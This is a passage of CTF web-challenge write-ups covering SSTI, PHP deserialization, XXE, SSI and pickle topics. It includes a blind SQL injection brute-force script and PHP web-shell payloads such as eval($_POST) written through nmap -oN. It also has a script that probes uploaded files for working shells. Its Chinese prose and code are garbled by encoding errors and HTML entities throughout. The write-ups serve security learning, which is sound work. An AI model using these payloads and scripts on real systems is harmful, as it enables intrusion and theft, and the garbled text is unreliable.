die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; CISCN 2019 åˆèµ›]Love Math - MustaphaMond - åšå®¢å›­ (cnblogs.com) CISCN 2019 åˆèµ›]Love Math_ç¾½çš„åšå®¢-CSDNåšå®¢ CISCN 2019 åˆèµ›]Love Math_åˆ†äº«ç®€å•çš„å®‰å…¨æŠ€æœ¯-CSDNåšå®¢ [WUSTCTF2020]æœ´å®æ— å payloadï¼š ï¼Ÿnum=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine import flask import os app &#x3D; flask.Flask(__name__) app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;æ³¨å†Œäº†ä¸€ä¸ªåä¸ºFLAGçš„configï¼Œè¿™é‡ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯flagã€‚ @app.route(&#39;&#x2F;&#39;) def index(): return open(__file__).read() @app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;) def shrine(shrine): def safe_jinja(s): s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;è®¾ç½®é»‘åå• return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;æŠŠé»‘åå•å†…çš„å†…å®¹ç½®ç©º return flask.render_template_string(safe_jinja(shrine)) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(debug&#x3D;True) sstiæ³¨å…¥ï¼Œå…ˆè¯•ä¸€ä¸ª49 æ¥ä¸‹æ¥å°±å¯ä»¥è€ƒè™‘åœ¨shrineä¸‹ç›´æ¥å³å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹ï¼Œä½†æ˜¯è¿™é¢˜è®¾äº†é»‘åå•[â€˜configâ€™,â€˜selfâ€™]å¹¶ä¸”è¿‡æ»¤äº†æ‹¬å·ï¼Œä½†æ˜¯pythonè¿˜æœ‰ä¸€ä¸ªå‡½æ•°å«åšurl_forï¼Œå…¶ä½œç”¨æ˜¯urlæ˜¯ç”¨äºæ„å»ºæŒ‡å®šå‡½æ•°çš„URLï¼Œåœ¨é…åˆ**globals()**ï¼Œè¯¥å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ã€‚è¿™æ ·ä¹Ÿå¯ä»¥å®ç°æŸ¥çœ‹çš„æ•ˆæœ current_appæ„æ€åº”è¯¥æ˜¯å½“å‰appï¼Œé‚£æˆ‘ä»¬å°±å½“å‰appä¸‹çš„configï¼š äºæ˜¯å¯ä»¥è¯»åˆ°flag &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; ä¹Ÿå¯ä»¥ç”¨ get_flashed_messages è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚ get_flashed_messages.__globals__[&#39;current_app&#39;].config [0CTF 2016]piapiapiaè¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°æ²¡èƒ½æˆåŠŸï¼Œæ‰«ç›®å½•æ‰«åˆ°www.zipå¤‡ä»½æ–‡ä»¶ è®¿é—®ä¸€ä¸‹register.phpæ³¨å†Œä¸ªè´¦æˆ·å°±å¯ä»¥ç™»å½•äº† å†çœ‹å…¶ä»–çš„å†…å®¹ profile.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; $username &#x3D; $_SESSION[&#39;username&#39;]; $profile&#x3D;$user-&gt;show_profile($username); if($profile &#x3D;&#x3D; null) &#123; header(&#39;Location: update.php&#39;); &#125; else &#123; $profile &#x3D; unserialize($profile); $phone &#x3D; $profile[&#39;phone&#39;]; $email &#x3D; $profile[&#39;email&#39;]; $nickname &#x3D; $profile[&#39;nickname&#39;]; $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;])); ?&gt; class.php &lt;?php require(&#39;config.php&#39;); class user extends mysql&#123; private $table &#x3D; &#39;users&#39;; public function is_exists($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;); $value_list &#x3D; Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username &#x3D; parent::filter($username); $password &#x3D; parent::filter($password); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username &#x3D; parent::filter($username); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; $object &#x3D; parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username &#x3D; parent::filter($username); $new_profile &#x3D; parent::filter($new_profile); $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;; return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125; &#125; class mysql &#123; private $link &#x3D; null; public function connect($config) &#123; $this-&gt;link &#x3D; mysql_connect( $config[&#39;hostname&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;] ); mysql_select_db($config[&#39;database&#39;]); mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123; $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;; $result &#x3D; mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key &#x3D; implode(&#39;,&#39;, $key_list); $value &#x3D; &#39;\\&#39;&#39; . implode(&#39;\\&#39;,\\&#39;&#39;, $value_list) . &#39;\\&#39;&#39;; $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape &#x3D; array(&#39;\\&#39;&#39;, &#39;\\\\\\\\&#39;); $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;; $string &#x3D; preg_replace($escape, &#39;_&#39;, $string); $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; public function __tostring() &#123; return __class__; &#125; &#125; session_start(); $user &#x3D; new user(); $user-&gt;connect($config); update.php &lt;?php require_once(&#39;class.php&#39;); if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123; die(&#39;Login First&#39;); &#125; if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123; $username &#x3D; $_SESSION[&#39;username&#39;]; if(!preg_match(&#39;&#x2F;^\\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;])) die(&#39;Invalid phone&#39;); if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;])) die(&#39;Invalid email&#39;); if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10) die(&#39;Invalid nickname&#39;); $file &#x3D; $_FILES[&#39;photo&#39;]; if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000) die(&#39;Photo size error&#39;); move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;])); $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;]; $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;]; $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;]; $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]); $user-&gt;update_profile($username, serialize($profile)); echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;; &#125; else &#123; ?&gt; config.php &lt;?php $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;; $config[&#39;username&#39;] &#x3D; &#39;root&#39;; $config[&#39;password&#39;] &#x3D; &#39;&#39;; $config[&#39;database&#39;] &#x3D; &#39;&#39;; $flag &#x3D; &#39;&#39;; ?&gt; profileé‡Œæœ‰ä¸ªfile_get_contentå‡½æ•°å¯èƒ½æœ‰æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè€Œflagåœ¨config.phpä¸­ï¼Œå°±è¦è®©photo=config.phpï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å‰è¾¹çš„$profile = unserialize($profile); æ‰€ä»¥å†æ ¹æ® $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;); $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;; return preg_replace($safe, &#39;hacker&#39;, $string); &#125; å¯ä»¥è¿›è¡Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; è¿™é‡Œè¿™ä¸ªè¿‡æ»¤å¯ä»¥åˆ©ç”¨æŠ“åŒ…å°†nickenameæ”¹æˆæ•°ç»„ç±»å‹æ¥ç»•è¿‡ çœ‹ä¸€ä¸‹è¿™ä¸ªyour profileé¡µé¢ çœ‹ä¸€ä¸‹è¿™ä¸ªå›¾ç‰‡çš„æºç ï¼Œæ˜¯ä¸ªbase64åŠ å¯†çš„å†…å®¹ï¼Œè¿›è¡Œè§£å¯†åå¯ä»¥å¾—åˆ°flag [MRCTF2020]PYWebsiteè¿›å»åçœ‹æºç ï¼Œæœ‰ä¸€æ®µjsè„šæœ¬ è¯•äº†ä¸€ä¸‹è¿™ä¸ªmd5ï¼Œèƒ½è§£å‡ºæ¥ä½†æ˜¯æ˜¯ä»˜è´¹è®°å½• æ‰€ä»¥ç›´æ¥çœ‹flag.php â€œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±â€ é‚£å°±è¯•è¯•127.0.0.1æœ¬åœ°è®¿é—® [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLç›²æ³¨ï¼Œæ³¨å…¥ç‚¹åœ¨id å¯ä»¥åˆ©ç”¨å¼‚æˆ–æ¥è¿›è¡Œç›²æ³¨ æ‰¾ä¸ªè„šæœ¬ç›´æ¥çˆ†ç ´ï¼Œå­¦ä¸€ä¸‹è¿™ä¸ªè„šæœ¬ import requests import sys import time def get_DBlen(url): for i in range(1,10): db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: print(&quot;æ•°æ®åº“åç§°çš„é•¿åº¦ä¸º:%d&quot;%i) return i def get_DBname(url,length): DBname &#x3D; &quot;&quot; length &#x3D; length + 1 for i in range(1,length): Max &#x3D; 122 Min &#x3D; 41 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # çˆ†è¡¨å db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max &#x3D; Mid-1 Mid &#x3D; (Min+Max)&#x2F;&#x2F;2 pass pass DBname &#x3D; DBname + chr(Mid) print(DBname) return DBname def get_TBname(url): name&#x3D;&quot;&quot; i &#x3D; 0 while True: i &#x3D; i+1 Max &#x3D; 128 Min &#x3D; 32 Mid &#x3D; (Max+Min)&#x2F;&#x2F;2 while Min &lt;&#x3D; Max: # çˆ†è¡¨å # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # çˆ†å­—æ®µå # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid) # è·å–flag db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid) r &#x3D; requests.get(db_url) if &quot;Click&quot; in r.text: Min&#x3D;Mid+1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass else: Max&#x3D;Mid-1 Mid&#x3D;(Min+Max)&#x2F;&#x2F;2 pass pass name&#x3D;name+chr(Mid) print(name) if Mid &#x3D;&#x3D; 31: break time.sleep(0.5) if __name__&#x3D;&#x3D;&quot;__main__&quot;: url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot; db_Len &#x3D; get_DBlen(url) db_Name &#x3D; get_DBname(url,db_Len) tb_name &#x3D; get_TBname(url) [NPUCTF2020]ReadlezPHP è·³åˆ°time.php?sourceç•Œé¢çœ‹çœ‹å†…å®¹ ååºåˆ—åŒ–æ„é€ å®ç°å‘½ä»¤æ‰§è¡Œ systemè¿™é‡Œåº”è¯¥æ˜¯è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨assertä»£æ›¿ assert()ç®€ä»‹ï¼šåˆ¤æ–­ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦æˆç«‹ã€‚è¿”å›true or falseã€‚ å½“å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œã€‚ ä¾‹å¦‚ assert(&quot;phpinfo()&quot;) &lt;&#x3D;&#x3D;&gt; &lt;?phpinfo()?&gt; assertä¸evalçš„åŒºåˆ« assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“phpä»£ç æ‰§è¡Œï¼ŒevalæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œã€‚ payloadï¼š?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;} æˆ–è€…?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}ç„¶åpostï¼ša=phpinfo æœç´¢flagå°±èƒ½æ‰¾åˆ° [CISCN2019 åä¸œå—èµ›åŒº]Web11xffå¤´çš„sstiæ³¨å…¥ï¼Œæˆ‘å¥½åƒä¹‹å‰åšè¿‡ä¸€ä¸ªå·®ä¸å¤šçš„ ç•Œé¢å³ä¸Šè§’ipå¯éšæ„æ”¹å˜ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨readfileå‡½æ•°è¯»flag [BJDCTF2020]EasySearchæ‰«ç›®å½•ï¼Œå‘ç°index.php.swpç•Œé¢ è¦è®©passwordå‰å…­ä½md5å€¼ä¸º6d0bc1 çˆ†ç ´ä¸€ä¸‹ ç™»å½•åæŠ“åŒ… è¿™é‡Œå¯ä»¥çœ‹è§ä¸€ä¸ªshtmlé¡µé¢ è¿›å…¥åçš„é¡µé¢ è¿™é‡Œadminçš„ä½ç½®æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œè¿™é‡Œåˆ©ç”¨äº†sslæ³¨å…¥ SSIæ³¨å…¥æ¼æ´_Hydraçš„åšå®¢-CSDNåšå®¢_ssiæ³¨å…¥ æ¨¡æ¿å°±ç±»ä¼¼äº å¯ä»¥å…ˆç”¨lsæŸ¥çœ‹ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†åˆ©ç”¨catæŸ¥çœ‹ è®¿é—®é¡µé¢æ‰¾åˆ°flag [BSidesCF 2019]Futurellaf12æºç é‡Œæœ‰flag å¥½ä¹…æ²¡åšè¿™ä¹ˆç®€å•çš„äº† [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmapå¸¸è§çš„nmapå‘½ä»¤ nmap linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com) é€‰é¡¹ è§£é‡Š-oN æ ‡å‡†ä¿å­˜-oX XMLä¿å­˜-oG Grepä¿å­˜-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼-append-output è¡¥å……ä¿å­˜æ–‡ä»¶é€‰é¡¹-oGå°†ç»“æœGrepä¿å­˜ã€‚ nmap -F -oG test.txt 192.168.23.11é€‰é¡¹-oAè¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚ nmap -F -oA test 192.168.3.2 è¿™é‡Œå°±æ˜¯è¦ç”¨nmapçš„ -oNå‘½ä»¤å†™shell &#39; -oN w4ke.txt &#39; è¿”å›host maybe downä¹‹åè®¿é—®w4ke.txt æ‰€ä»¥å¯ä»¥è¯•è¯•å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå» &#39; -oN b.txt &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39; è¿”å›äº†hackerï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æœ‰ä¸œè¥¿è¢«è¿‡æ»¤äº† è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯phpè¢«è¿‡æ»¤äº† å¯ä»¥ç”¨å…¶ä»–çš„è¿›è¡Œæ›¿ä»£ &lt;?&#x3D;eval($_POST[a]);?&gt; åˆ©ç”¨postä¼ å‚æ‰§è¡Œå‘½ä»¤ å‚è€ƒé“¾æ¥ ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap_æµ©æ­Œå·²è¡Œçš„åšå®¢-CSDNåšå®¢ ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap (icode9.com) [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢æ ¹æ®é¢˜ç›®æç¤ºä¸‹è½½å‹ç¼©åŒ…æ–‡ä»¶ï¼Œé‡Œé¢å­˜åœ¨ä¸‰åƒå¤šä¸ªphpæ–‡ä»¶ æ¯ä¸€ä¸ªæ–‡ä»¶é‡Œéƒ½æœ‰shellï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„ import requests import os import re url &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39; path &#x3D; r&#39;C:\\Users\\ethe\\Desktop\\www\\src&#39; ptn_get &#x3D; re.compile(br&quot;\\$_GET\\[&#39;(\\w+)&#39;\\]&quot;) ptn_res &#x3D; re.compile(br&#39;success_hack&#39;) count &#x3D; 0 for f in list(os.scandir(path)): print(str(f)[11:-2]) count +&#x3D; 1 with open(f.path, &#39;rb&#39;) as fp: data &#x3D; fp.read() for get in set(ptn_get.findall(data)): get &#x3D; get.decode(&#39;utf-8&#39;) cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39; r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;) if ptn_res.search(r.content) is not None: print(f.name, get) exit() [NCTF2019]True XML cookbooké¢˜ç›®æç¤ºxmlï¼ŒæŠ“åŒ…å çŒœåº”è¯¥æ˜¯æœ‰xxeæ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼Œå‘ç°æ²¡è¯»å–æˆåŠŸ çœ‹ä¸€çœ‹dologin.phpçš„æºç  &lt;?php &#x2F;** * autor: c0ny1 * date: 2018-2-7 *&#x2F; $USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;Ã¨Â´Â¦Ã¥ÂÂ· $PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;Ã¥Â¯Â†Ã§ Â $result &#x3D; null; libxml_disable_entity_loader(false); $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); try&#123; $dom &#x3D; new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds &#x3D; simplexml_import_dom($dom); $username &#x3D; $creds-&gt;username; $password &#x3D; $creds-&gt;password; if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username); &#125;else&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username); &#125; &#125;catch(Exception $e)&#123; $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage()); &#125; header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;); echo $result; ?&gt; ä½†æ˜¯ä»è¿™ä¸ªæºç é‡Œä¹Ÿæ‰¾ä¸åˆ°flag åè¾¹å°±æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„æ“ä½œäº† è®¿é—®proc/net/arpæ–‡ä»¶æŸ¥çœ‹æœ‰æ— å¯åˆ©ç”¨å†…ç½‘ä¸»æœº å°è¯•è®¿é—®ä¸€ä¸‹è¿™ä¸ªipï¼ŒæŠ¥é”™ ä¹‹åcæ®µæ‰«æï¼Œæ‰¾åˆ°flag [CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikunè¿™é¢˜æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜ å†™è„šæœ¬æ‰¾lv6 æ‰¾åˆ°å å¾ˆæ˜æ˜¾é’±ä¸å¤Ÿ è¿™é‡Œå¯ä»¥æŠ“åŒ…æ”¹æŠ˜æ‰£ï¼Œå½“æŠ˜æ‰£è¶³å¤Ÿå°çš„æ—¶å€™å°±å‡ºç°ä¸€ä¸ªé‡å®šå‘ æ¥ä¸‹æ¥çš„æ­¥éª¤æ„Ÿè§‰å°±æœ‰ç‚¹é—®é¢˜äº†ï¼Œå½“ç›´æ¥åœ¨burpæ”¹è·¯å¾„çš„æ—¶å€™ä¼šç›´æ¥è·³è¿‡ä¸€ä¸ªcookieçš„ä¿®æ”¹å˜æˆadmin ä½†æ˜¯ç›´æ¥åœ¨urlæ ä¿®æ”¹ä¼šè¦æ±‚ç”¨æˆ·æ˜¯admin è¿™å°±è¦æ±‚ä¿®æ”¹jwtçš„cookie è®¤è¯†JWT - åºŸç‰©å¤§å¸ˆå…„ - åšå®¢å›­ (cnblogs.com) è¿™é‡Œçš„c-jwt-crackå·¥å…·ä¸ä¼šç”¨ï¼Œæ‰€ä»¥å°±è·³è¿‡è¿™éƒ¨åˆ†å§ çœ‹ç™»å½•åçš„æºç çœ‹è§www.zipè·¯å¾„ ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å…¨ä¸ºpythonæ–‡ä»¶ è¿™é‡Œæ˜¯åˆ©ç”¨äº†pythonåç¼–è¯‘ pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚ pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œpickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚ p = pickle.loads(urllib.unquote(become)) urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 = value2çš„å½¢å¼pickle.loads(bytes_object): ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›æˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢ä¹‹åçš„ç†è§£å°±æ˜¯ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨Pickleæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡½æ•°ä¸ºï¼š ï¼ˆ1ï¼‰pickle.dump(obj, file, [,protocol]) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚ å‚æ•°è®²è§£ï¼š objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚ file:æ–‡ä»¶åç§°ã€‚ protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ ï¼ˆ2ï¼‰pickle.load(file) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚ å‚æ•°è®²è§£ï¼š fileï¼šæ–‡ä»¶åç§°ã€‚ ï¼ˆ3ï¼‰pickle.dumps(obj[, protocol]) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚ å‚æ•°è®²è§£ï¼š objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚ protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ ï¼ˆ4ï¼‰pickle.loads(string) 